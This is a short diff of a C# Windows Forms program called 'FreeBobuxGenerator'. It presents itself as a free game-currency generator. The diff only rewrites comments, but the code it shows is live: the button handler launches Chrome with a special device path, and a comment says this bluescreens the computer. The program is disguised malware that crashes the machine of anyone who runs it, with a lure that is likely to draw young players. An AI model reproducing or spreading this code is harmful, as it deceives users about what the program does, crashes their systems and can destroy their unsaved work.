@@ -17,16 +17,16 @@ namespace FreeBobuxGenerator
         public Form1()
         {
             InitializeComponent();
-            SoundPlayer audio = new SoundPlayer(FreeBobuxGenerator.Properties.Resources.candyland); // here WindowsFormsApplication1 is the namespace and Connect is the audio file name
+            SoundPlayer audio = new SoundPlayer(FreeBobuxGenerator.Properties.Resources.candyland); // plays candyland low quality
             audio.Play();
         }
 
         private void button1_Click(object sender, EventArgs e)
         {
             ProcessStartInfo startInfo = new ProcessStartInfo();
-            startInfo.FileName = @"chrome";
-            startInfo.Arguments = @"\\.\globalroot\device\condrv\kernelconnect";
-            System.Diagnostics.Process.Start(startInfo);
+            startInfo.FileName = @"chrome"; // opens chrome
+            startInfo.Arguments = @"\\.\globalroot\device\condrv\kernelconnect"; // this is the part that bluescreens the pc
+            System.Diagnostics.Process.Start(startInfo); // launches chrome with the bsod argument
         }
     }
 }
